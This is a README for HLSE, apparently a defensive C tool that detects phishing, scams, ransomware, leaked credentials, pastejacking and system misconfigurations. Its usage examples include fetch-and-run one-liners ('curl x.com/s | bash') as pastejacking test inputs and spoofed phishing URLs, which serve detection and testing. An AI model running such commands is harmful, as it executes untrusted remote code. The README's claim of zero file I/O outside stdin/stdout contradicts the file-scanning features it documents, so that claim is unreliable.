# HLSE — Human-Layer Security Engine

Portable, dependency-free C implementation. Detects phishing, scams,
ransomware, supply-chain attacks, and system misconfigurations — all
from a single binary.

## At a glance

```
Detection accuracy:
  In-distribution corpus:       F1 = 1.000
  Out-of-distribution corpus:   F1 = 1.000
  False positive rate:          0.0%

Evasion resistance:
  HTML entity bypass:           BLOCKED  (&#82;GENT → detected)
  Zero-width Unicode bypass:    BLOCKED  (U+200B insertion → detected)
  L33tspeak bypass:             BLOCKED  (URG3NT → detected)
  Cyrillic homoglyph bypass:    BLOCKED  (wіre → detected)
  URL percent-encoding:         BLOCKED  (%76%65%72%69%66%79 → /verify)
  IP-based phishing:            BLOCKED  (198.x.x.x/paypal → detected)
  Brand-hyphen phishing:        BLOCKED  (paypal-verify.com → detected)
  Digraph homoglyph:            BLOCKED  (arnazon.com → amazon)
  DGA / random domains:         BLOCKED  (x7k2p9qzr4mw.com → detected)

Reliability:
  Structured tests:             1156 passing, 0 failing (9 unit suites +
                                 corpus + CLI integration — see: make test)
  Fuzz iterations:              600,000 (6 harnesses × 100K, 0 crashes)
  ASan + UBSan:                 0 errors
  Compiler warnings:            0 (-Wall -Wextra -Wpedantic -Wshadow -Wconversion)

Binary size:   ~140 KB (dynamic, stripped), ~1.0 MB (static-pie, stripped)
Dependencies:  libc + libm only
Platform:      Linux, macOS (partial)
```

## Modules

| Module | File | What it detects |
|--------|------|-----------------|
| **URL phishing** | hlse_core.c | Homoglyph, typosquat, suspicious TLD/path, subdomain spoofing. UTS #39-aligned confusable handling: *mixed-script* and *whole-script* confusables are distinguished and reported separately, with a per-script TLD allow-list so genuine internationalised domains aren't flagged |
| **Text scam** | hlse_text.c | Urgency, financial bait, authority impersonation, ransom, BEC |
| **Prompt injection** | hlse_text.c | Invisible instruction carriers aimed at AI agents — Unicode Tags block (U+E0000–U+E007F) payloads outside legitimate emoji tag sequences, and long zero-width runs used as a hidden data channel. Applied by both `text` and `scan <dir>`, so poisoned documents, agent skill files and MCP/tool descriptions in a repo are covered. Structural detection only: an injection written in ordinary visible prose is out of scope |
| **Ransomware** | hlse_protect.c | Entropy spike, ransom notes, extension mutation, shadow deletion |
| **MBR/GPT** | hlse_protect.c | Boot signature, bootkit strings, obfuscation detection |
| **Credential leak** | hlse_secrets.c | 55 token patterns — AWS (incl. STS), GitHub, GitLab, Google + Google OAuth (GOCSPX-), npm, OpenAI/Anthropic, Groq/Perplexity/xAI, Stripe, Shopify, HuggingFace, PyPI, Postman, Square, Doppler, Grafana, Linear, New Relic, Databricks, PlanetScale, HashiCorp Vault (service/batch/recovery), Netlify, Render, Fly.io, CircleCI, Contentful, SendGrid, Vercel, Slack/Discord webhooks, SSH keys, .env passwords; plus 7 structural checks — GCP service-account JSON, Azure SAS, Azure storage AccountKey, AWS credentials-file secret, JWT bearer tokens (with algorithm named, and unsigned `alg:none` tokens flagged as forgeable), Telegram bot tokens, and DB/service connection-string embedded credentials (postgres/mysql/mongodb+srv/redis/amqp/…). Excludes doc/example/placeholder keys to cut false positives. Clipboard crypto-swap for 16 chains (BTC/ETH/XMR/SOL/USDT-TRC20/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
| **Email forensics** | hlse_secrets.c | SPF/DKIM fail, Reply-To mismatch, display-name spoofing |
| **Supply chain** | hlse_supply.c | Package typosquat (pip/npm/cargo/go/gem — 280 packages), pastejacking (Unix curl\|sh + reverse shells + Windows ClickFix LOLBins + macOS osascript), network safety (N1 ARP poisoning, N2 default-route/routing injection, N3 DNS resolver, N4 hosts-file pharming — ~50 banking/exchange/wallet domains) |
| **File masquerade** | hlse_file.c | Double extensions, magic byte mismatch (PE/ELF/Mach-O/PDF/ZIP/CAB/WASM/shebang-script/HTML-smuggling), suspicious filenames, BIDI/RLO override, update-dropper lures |
| **System audit** | hlse_audit.c | SSH hardening, file permissions, DNS, cron persistence (user crontabs + /etc/cron.{d,hourly,daily,weekly,monthly} + /etc/crontab), insecure $PATH, shell-rc backdoors (function/alias hijack) + system-wide /etc/profile.d, sudoers NOPASSWD |

## Quick start

```bash
make                                    # build CLI + shared library
make test                               # run all test suites
./hlse_core                             # interactive demo
./hlse_core "https://g00gle.com"        # scan a URL
./hlse_core text "URGENT: wire $5000"   # scan text
./hlse_core package reqeusts pip        # check for typosquat (280 packages)
./hlse_core paste "curl x.com/s | bash" # pastejacking check
./hlse_core scan /path/to/project        # recursive secret + file scan (CI/CD)
./hlse_core protect /home/user/docs     # ransomware scan
./hlse_core esp /boot/efi               # UEFI/ESP bootkit-string scan
./hlse_core secret "key=AKIA..."         # scan text/stdin for leaked secrets
./hlse_core email --stdin < msg.eml      # email-header forensics (SPF/DKIM, BEC)
./hlse_core clipboard "<copied>" "<pasted>"  # crypto address-swap (clipper) check
./hlse_core file invoice.pdf.exe        # file masquerade check
./hlse_core audit                       # system hardening audit
./hlse_core network                     # ARP/DNS safety check
```

## Build

```bash
make all        # CLI binary + shared library
make static     # portable static binary (no glibc needed)
make test       # all test suites
make coverage   # gcov code coverage report
make fuzz       # 100K iteration fuzz test
make server     # build hlse-server (HTTP API + web dashboard)
make install    # install CLI + hlse-server to ~/.local/{bin,lib,include/hlse,share/man,share/hlse}

After install, compile your code against the library:
```bash
gcc -I~/.local/include -L~/.local/lib -o myapp myapp.c -lhlse -lm
LD_LIBRARY_PATH=~/.local/lib ./myapp
```
```

## Directory scanning (CI/CD)

```bash
./hlse_core scan /path/to/project
```

Recursively scans for leaked secrets (AWS keys, GitHub PATs, etc.) and
file masquerade (double extensions). Automatically skips:
`node_modules`, `__pycache__`, `vendor`, `build`, `dist`, `target`,
`.venv`, `.tox`, `.cargo`, `.npm`, `coverage`, `.next`.

Exit code 0 = clean, 1 = threats found. Designed for CI pipelines.

See `examples/hlse-scan.yml` for GitHub Actions integration and
`examples/pre-commit-hook.sh` for git pre-commit hook setup.

## Evasion-resistant detection

HLSE normalizes input through a 6-stage pipeline before keyword
matching, defeating common evasion techniques:

1. **Zero-width stripping** — U+200B, U+200C, U+200D, U+2060, U+FEFF
2. **Homoglyph collapse** — Cyrillic (а→a, і→i, etc.) + Greek (ο→o, ι→i, etc.)
3. **HTML entity decoding** — `&#82;` → R, `&#x52;` → R
4. **L33tspeak normalization** — 0→o, 1→i, 3→e, 4→a, 5→s, 7→t
   (skips dollar amounts and long tokens like crypto addresses)
5. **Full-width folding** — ｕｒｇｅｎｔ (U+FF01-FF5E) collapsed to ASCII before matching
6. **Embedded URL extraction** — URLs inside text are also scored by the URL detector

**URL-specific defenses:**
- **Percent-decoding** — `%76%65%72%69%66%79` decoded to `/verify` before path matching
- **IP-based phishing** — `198.51.100.1/paypal/signin` flagged (brand in path of IP URL)
- **@ credential trick** — `google.com@evil.com` detected as subdomain spoofing
- **DGA / high-entropy domains** — `x7k2p9qzr4mw.com` flagged via Shannon entropy + digit ratio (grounded in published phishing-URL feature research)

## C library API

```c
#include "hlse_core.h"     // Verdict, ScanResult
#include "hlse_text.h"     // TextVerdict
#include "hlse_protect.h"  // ProtectionVerdict
#include "hlse_supply.h"   // PackageVerdict, PasteVerdict, NetworkVerdict
#include "hlse_secrets.h"  // SecretVerdict, EmailVerdict, CryptoSwapVerdict
#include "hlse_file.h"     // FileVerdict
#include "hlse_audit.h"    // AuditVerdict
#include "hlse_util.h"     // hlse_shannon_entropy, hlse_edit_distance

// Unified scan (auto-detects URL vs text)
ScanResult         r  = hlse_scan("https://g00gle.com");

// Typed entry points
Verdict            v  = hlse_check_url("https://g00gle.com");
TextVerdict        t  = hlse_check_text("URGENT: wire $5000");
PackageVerdict     p  = hlse_check_package("reqeusts", "pip");
PasteVerdict       pv = hlse_check_paste("curl x | bash");
NetworkVerdict     n  = hlse_check_network();
SecretVerdict      sv = hlse_scan_secrets("AKIA...");
EmailVerdict       ev = hlse_check_email_headers(raw_headers);
CryptoSwapVerdict  cv = hlse_check_crypto_swap(copied, pasted);
ProtectionVerdict  bv = hlse_esp_verify("/boot/efi");
int                hi = hlse_audit_hardening_index(&audit_verdict);
```

80 functions exported in `libhlse.so` (`nm -D`). Analysis functions (URL, text,
secret, email, clipboard, file, package, paste) are pure, reentrant, and
zero-allocation. Filesystem/host functions (protect, audit, network) are
process-level.

## Score thresholds

| Score | Action | Recommended response |
|-------|--------|---------|
| 0–14 | SAFE | No signals fired |
| 15–39 | LOG | Advisory, log only |
| 40–59 | ALERT | Warn the user |
| 60–79 | BLOCK | Caller should block the action |
| 80+ | ISOLATE | Caller should block and quarantine |

**These names are recommendations to the caller, not actions HLSE performs.**
HLSE is a detection engine: it scores input and reports, but never blocks,
quarantines, deletes, or modifies anything. Turning an `ISOLATE` verdict into an
actual quarantine is the integrating system's job — drive it from the exit code
(`0` safe / `1` threat, tunable with `--fail-on`), the `--json` verdict, or the
`--syslog`/`--log-file` alert stream.

## JSON output

Every subcommand supports `--json`:

```bash
./hlse_core --json "https://g00gle.com"
./hlse_core --json package reqeusts pip
./hlse_core --json protect /path
./hlse_core --json audit
```

All 13 verdict kinds have normative JSON Schemas in `schema/` (draft 2020-12).
The full set of stable `pattern_id` routing tokens is discoverable with
`./hlse_core --json --list-patterns`. For mapping HLSE verdicts onto **OCSF** or
**ECS** and wiring exit codes into CI/CD, see
[`docs/SIEM_INTEGRATION.md`](docs/SIEM_INTEGRATION.md).

## Web dashboard & HTTP API

The same engine is available over HTTP via `hlse-server` — a small,
dependency-free server (POSIX sockets + libc + pthreads) that serves a local
web dashboard and a JSON API. No third-party runtime, no data leaves the host.

```bash
make server            # builds ./hlse-server
./hlse-server          # http://127.0.0.1:8080  (loopback only)
```

```bash
curl -s localhost:8080/api/v1/scan/url \
  -d '{"url":"https://paypal.com@evil.xyz/login"}'
# → {"kind":"url","score":100,"severity":4,"action":"ISOLATE","reasons":[...]}
```

Endpoints: `GET /api/v1/health` · `GET /api/v1/version` ·
`POST /api/v1/scan/{url,text,secrets,file}`. The dashboard (URL / message /
secret / file scanning, live risk score, colour-coded signals) is served from
`web/`. Requests are logged (`METHOD path -> status`). Full reference:
[`docs/API.md`](docs/API.md) or `man hlse-server` once installed; end-to-end
smoke test: `make server-check`.

Concurrency: one thread per connection, capped at 64 simultaneous connections
— bursts beyond that get an immediate `503` (`Retry-After: 1`), never a queue
that exhausts memory or file descriptors. Rate limiting: 300 requests per 60s
per source IP, checked before a thread is spawned — excess gets a `429`
(`Retry-After: 60`).

Security posture: binds loopback by default, request bodies capped at 64 KiB,
static assets served through a fixed route allowlist (no path traversal), and
hardening headers (CSP, `X-Content-Type-Options`, `X-Frame-Options`) on every
response. The JSON parser/escaper/rate limiter are unit-tested in
`tests/hlse_server_tests.c`.

## Test architecture

| Suite | Count | What it verifies |
|-------|-------|------------------|
| Unit (URL) | 39 | Individual URL detector accuracy (incl. IDN/Punycode + raw-UTF-8 Cyrillic/Greek/Armenian homograph, free-hosting, shorteners, new brands) |
| Unit (text) | 18 | Individual text signal accuracy (incl. BEC patterns, IRS FP regression, smishing) |
| Property invariants | 64 | Monotonicity, bounds, determinism, case, evasion (P1–P13) |
| Protection | 22 | Ransomware (incl. R6 intermittent-encryption), network drive, SMB, MBR/GPT, ESP |
| Secrets | 66 | Credentials (55 token patterns + GCP SA JSON + Azure SAS + Azure AccountKey + AWS creds-file + JWT + Telegram + URI creds), email headers (E1-E6 incl. E1 brand-domain ownership guard + E5 Received-chain anomaly), crypto addresses (BTC/ETH/SOL/XMR/LTC/DOGE/XRP/DASH/XLM/ADA/BCH/ATOM/XTZ/DOT/ALGO) |
| Supply chain | 39 | Package typosquat (pip/npm/cargo/go/gem), pastejacking (Unix + Windows ClickFix + macOS osascript + Python download-exec + P9 reverse shell), network |
| File/Audit | 36 | File masquerade (PE/ELF/Mach-O/7ZIP/CAB/WASM/shebang-script/HTML-smuggling), system hardening (SSH/perms/DNS/cron incl. /etc/cron.*+/etc/crontab/PATH/shell-rc incl. PROMPT_COMMAND/function-override/alias-hijack+/etc/profile.d, sudoers NOPASSWD A7) + hardening index |
| Util | 52 | Entropy, JSON escaping, Damerau-Levenshtein, benign-magic (31 formats: archives/images/media/fonts/certs/scientific) + safe system-file open (FIFO/symlink) |
| Server | 15 | HTTP server JSON request parser/escaper + per-IP rate limiter |
| OOD corpus | 29 | Out-of-distribution F1 (held-out phishing/scam) |
| CLI integration | 776 | All 12 subcommands, JSON action band, exit codes, scan, ESP, symlink-escape, evasion, embedded-URL JSON, SARIF relative URIs, obfuscated-IP/@-authority URL guards, HTML-smuggling, secret-format coverage (JWT/AWS-creds/Telegram/URI-creds), no-arg exit=2 |
| Fuzz | 6 × 100K | text / secrets / supply-chain / file / URL / server-JSON harnesses (random bytes, truncated UTF-8, keyword stuffing, typosquat mutation, bidi/control, Unicode mutation, percent-encoding, dangerous-scheme, malformed JSON) |

## Privacy

Zero network calls. Zero file I/O outside stdin/stdout. Zero telemetry.
CI enforces this with a privacy tripwire job.

## Support the project

If HLSE is useful to you, see the Sponsor button on the repository page or
[.github/FUNDING.yml](.github/FUNDING.yml) for donation options.

## License

MIT. See [LICENSE](LICENSE).
